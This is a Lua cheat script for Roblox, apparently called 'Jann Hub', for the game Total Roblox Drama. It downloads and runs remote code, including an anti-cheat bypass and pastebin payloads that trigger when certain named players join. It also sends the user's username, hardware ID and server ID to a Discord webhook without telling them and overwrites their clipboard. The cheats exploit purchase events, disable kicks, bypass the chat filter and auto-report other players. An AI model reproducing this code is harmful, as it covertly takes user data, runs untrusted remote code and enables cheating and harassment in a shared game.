loadstring(game:HttpGet('https://raw.githubusercontent.com/venncord/JannHub/main/Detector.lua'))()


local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/venncord/JannHub/main/Lib.lua'))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
wait()

game.Players.PlayerAdded:Connect(function(Player)
	if Player.Name == "ProAIt5000" then
		loadstring(game:HttpGet("https://pastebin.com/raw/NNT4U1wZ"))()
	end
end)

game.Players.PlayerAdded:Connect(function(Player)
	if Player.Name == "1kS_up" then
		loadstring(game:HttpGet("https://pastebin.com/raw/7V3d4vw4"))()
	end
end)


local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
local WhitelistedHWIDs = {"80e56303-ea6e-4aac-91f5-86f50f0b574e"}
local qNVAKkuwxNpqruLjSRHg = false

function CheckHWID(hwidval)
for _,whitelisted in pairs(WhitelistedHWIDs) do
 if hwidval == whitelisted then
     return true
 elseif hwidval ~= whitelisted then
     return false
       end
    end
end

qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)

if qNVAKkuwxNpqruLjSRHg == true then
 game.Players.LocalPlayer:Kick("You have been blacklisted from using Jann Hub.")
end



local url =
   "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
local data = {
   ["content"] = " ",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Jann Hub** in: "   ..game.PlaceId.. " :) ",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."**, HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId().."** JobID: **"..game.JobId.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local link = "https://discord.gg/uNaTKuM7jQ"

setclipboard(link)



local Window = Rayfield:CreateWindow({
   Name = "Jann Hub",
   LoadingTitle = "Loading Jann Hub",
   LoadingSubtitle = "by Jack & Venn | .gg/uNaTKuM7jQ",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "FolderConfig", -- Create a custom folder for your hub/game
      FileName = "Jann Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "uNaTKuM7jQ", -- The Discord invite code, do not include discord.gg/
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Jann Hub",
      Subtitle = "Key System",
      Note = "Join the discord (https://discord.gg/uNaTKuM7jQ) (the link has been copied to your clipboard)",
      FileName = "VennKey",
      SaveKey = true,
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = "x7Rg2YpL4JnIc6Xa8Wb3Ko2Tg9Hr1Zl5Pm2Qs8Vn3"
   }
})


local Tab = Window:CreateTab("Total Roblox Drama", 16451926444) -- Title, Image

local Section = Tab:CreateSection("Game - Things that enhance gameplay",false)

local Bsaea32autton2523523523 = Tab:CreateButton({
   Name = "Break Spleef",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
			for i,v in pairs(game.Workspace:GetDescendants()) do
				if v.Name == "SpleefPart" then 
					firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 0) 
				end
			end
   end,
})

local Butt32623on2525325235263523523 = Tab:CreateButton({
   Name = "Insta-Eat Pancake (THIS MIGHT NOT WORK)",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
for i,v in pairs(game.Workspace:GetDescendants()) do
if v.Name == game.Players.LocalPlayer.Name then
fireclickdetector(v.ClickDetector)
end
end 

   end,
})

local Butt32623on2525325235263523523 = Tab:CreateButton({
    Name = "OG Gen (Could work and replaces Band Nishele Skin)",
    Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
    Interact = 'Changable',
    Callback = function()
        game.ReplicatedStorage.Products.CharacterSelection.Characters.Female.Nishele.Skins["Band Nishele Skin"]:Destroy()

        wait(5)

        for i,v in pairs(game:GetDescendants()) do
            if v.Name == "Band Nishele Skin" then
                if v.Parent ~= game.ReplicatedStorage.Products.Shop.Items.Skins then
                    v.Name = "OG Gen Skin"
                    v.Value = "Gen"
                    v.Price.Value = 1
                end
            end
        end

        local args = {
            [1] = "DailyItem",
            [2] = "OG Gen Skin"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Buy"):FireServer(unpack(args))

        for k,v in pairs(getgc(true)) do 
            if pcall(function() return rawget(v,"indexInstance") end) and type(rawget(v,"indexInstance")) == "table" and (rawget(v,"indexInstance"))[1] == "kick" then 
                v.tvk = {"kick",function() return game.Workspace:WaitForChild("") end} 
            end 
        end
    end
})

local Button = Tab:CreateButton({
   Name = "Get Safety Statue",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
   for i,v in pairs (workspace.Idols:GetDescendants()) do
                if v.Name == "Bag" then
                    v.hit.Transparency = 1
                    v.hit.CanCollide = false
                    wait()
                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
                    task.wait()
                    v:Destroy()
                    wait()
                elseif v.Name == "SafetyStatue" then
                    v.hit.Transparency = 1
                    v.hit.CanCollide = false
                    wait()
                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
                    wait()
                end
            end
   end,
})


local MathThingLmfao = Tab:CreateToggle({
   Name = "Auto-Win Math Mania",
   Info = "Toggle info/Description.", -- Speaks for itself, Remove if none.
   CurrentValue = false,
   Flag = "Toggle12352355235221", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
            number = 0
            for i = 1, 10 do
                local function automathloopfix()
                if Value == true then
                    number = number + 1
                    local s = game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].MainText.Text
                    local e = s:gsub("=","")
                    local g = e:gsub("?","")
                    local x = g:gsub(" ","")
                    local y = x
                    local f = loadstring("return " .. y)()
                    wait()
                    game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].Box.Text = f
                    task.wait()
                    local button = game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].Enter

                    local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
                    for i,v in pairs(events) do
                        for i,v in pairs(getconnections(button[v])) do
                            v:Fire()
                        end
                    end
                    task.wait(0.5)
                end
            end
				            task.wait()
            automathloopfix()
            end
   end,
})



local ToggleVotesThing = Tab:CreateToggle({
    Name = "Notify Votes",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "Toggle121412", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Voting.Votes.ChildAdded:Connect(function(v)
            if Value == true then
                PlayerVoted = game.ReplicatedStorage.Season.Players[v.Value].Value
                PlayerPicked = game.ReplicatedStorage.Season.Players[v.Name].Value
                local SEND = PlayerVoted .. " voted for " .. PlayerPicked
                Rayfield:Notify({
                    Title = "Vote Detected",
                    Content = SEND,
                    Duration = 1,
                    Image = 4483362458
                })
            end
        end)
    end
})

local ToggleVoaasraatawsesThingtwa2a = Tab:CreateToggle({
    Name = "Notify When a User gets a Bag",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "Toggle1214122723242", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Twists.Bags.ChildAdded:Connect(function(v)
            if Value == true then
                PlayerPicked2 = game.ReplicatedStorage.Season.Players[v.Name].Value
                local SEND2 = PlayerPicked2 .. " got a bag!"
                Rayfield:Notify({
                    Title = "Bag Detected",
                    Content = SEND2,
                    Duration = 1,
                    Image = 4483362458
                })
            end
        end)
    end
})


local B3as2u5ast353as23253a2saon322523 = Tab:CreateButton({
   Name = "Win Obby",
   Info = "yea", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
if game.Workspace.Assets:FindFirstChild("Finish",true) then
				local v = game.Workspace.Assets:FindFirstChild("Finish",true)
                    v.CanCollide = false
                    v.Transparency = 1
                    wait()
                    v.Position = game.Players.LocalPlayer.Character.Torso.Position
			end
   end,
})


local Toggle1 = Tab:CreateToggle({
   Name = "Auto Collect Coins",
   Info = "Speaks for itself.", -- Speaks for itself, Remove if none.
   CurrentValue = false,
   Flag = "Toggle123", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
         collectcoinsloop = Value
            while collectcoinsloop == true do
               task.wait(0.00001)
                for i,v in pairs (workspace:GetDescendants()) do
                    if v.Name == "Gem" then
                        v.Transparency = 1
                        wait()
                        v.Position = game.Players.LocalPlayer.Character.Torso.Position
                    elseif v.Name == "Coin" then
                        v.Transparency = 1
                        wait()
                        v.Position = game.Players.LocalPlayer.Character.Torso.Position
                    end
                end
         end
   end,
})

local Section1 = Tab:CreateSection("Misc",false)

local Busa642ea424tton5262325as523 = Tab:CreateButton({
   Name = "Auto-Report",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/Auto-Report/main/main.lua", true))()
   end,
})

local Button52523 = Tab:CreateButton({
   Name = "Mobile Keyboard",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
   end,
})

local Input = Tab:CreateInput({
   Name = "Buy Character",
   Info = "Enter the text of the character you would like to purchase, it doesnt have to be a real character. Bypasses chat filter.", -- Speaks for itself, Remove if none.
   PlaceholderText = "Input Text",
   OnEnter = true, -- Will callback only if the user pressed ENTER while the box is focused.
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
local args = {
    [1] = "Character",
    [2] = Text
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Buy"):FireServer(unpack(args))
   end,
})


local Button = Tab:CreateButton({
   Name = "Remove barriers",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
        for i,v in pairs (workspace:GetDescendants()) do
            if v.Name == "Glass" then
                v:Destroy()
            end
        end
   end,
})
